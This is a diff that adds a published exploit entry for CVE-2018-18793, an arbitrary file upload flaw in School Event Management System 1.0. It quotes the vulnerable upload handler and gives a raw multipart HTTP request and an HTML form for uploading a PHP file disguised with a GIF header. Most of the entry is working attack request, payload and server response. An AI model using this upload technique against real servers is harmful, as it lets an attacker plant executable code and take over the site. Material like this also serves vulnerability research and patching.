@@ -1,0 +1,89 @@
+# Exploit Title: School Event Management System 1.0 - Arbitrary File Upload
+# Dork: N/A
+# Date: 2018-10-29
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://www.sourcecodester.com/users/janobe
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/janobe/sems_1.zip
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2018-18793
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/event/controller.php?action=photos
+# 
+GIFefe
+<?php
+.....
+?>
+# http://localhost/[PATH]/event/photo/[FILE]
+# 
+#[PATH]/event/controller.php
+#....
+#29	function doInsert(){
+#30	if(isset($_POST['save'])){
+#31  
+#32 
+#33	$errofile = $_FILES['image']['error'];
+#34	$type = $_FILES['image']['type'];
+#35	$temp = $_FILES['image']['tmp_name'];
+#36	$myfile =$_FILES['image']['name'];
+#37	$location="photo/".$myfile;
+#38	
+#39	@$file=$_FILES['image']['tmp_name'];
+#40	@$image= addslashes(file_get_contents($_FILES['image']['tmp_name']));
+#41	@$image_name= addslashes($_FILES['image']['name']); 
+#42	@$image_size= getimagesize($_FILES['image']['tmp_name']);
+#....
+GET /[PATH]/event/controller.php?action=photos HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=mrht5eahsjgrpgldk6c455ncm3
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=
+---------------------------3634372676911755021110261466
+Content-Length: 617
+-----------------------------3634372676911755021110261466
+Content-Disposition: form-data; name="EventID"
+1
+-----------------------------3634372676911755021110261466
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+1000000
+-----------------------------3634372676911755021110261466
+Content-Disposition: form-data; name="photo"; filename="phpinfo_gif.php"
+Content-Type: application/force-download
+GIFefe
+<?php
+phpinfo();
+?>
+-----------------------------3634372676911755021110261466
+Content-Disposition: form-data; name="savephoto"
+-----------------------------3634372676911755021110261466--
+HTTP/1.1 200 OK
+Date: Sun, 28 Oct 2018 17:27:54 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 143
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+<html>
+<body>
+<form action="http://localhost/[PATH]/event/controller.php?action=photos" enctype="multipart/form-data" method="post">
+<input name="EventID" id="EventID" value="1" type="hidden">
+<input name="MAX_FILE_SIZE" value="1000000" type="hidden"> 
+<input id="photo" name="photo" type="file">
+<button name="savephoto" type="submit">Upload Photo</button>
+</form>
+</body>
+</html>
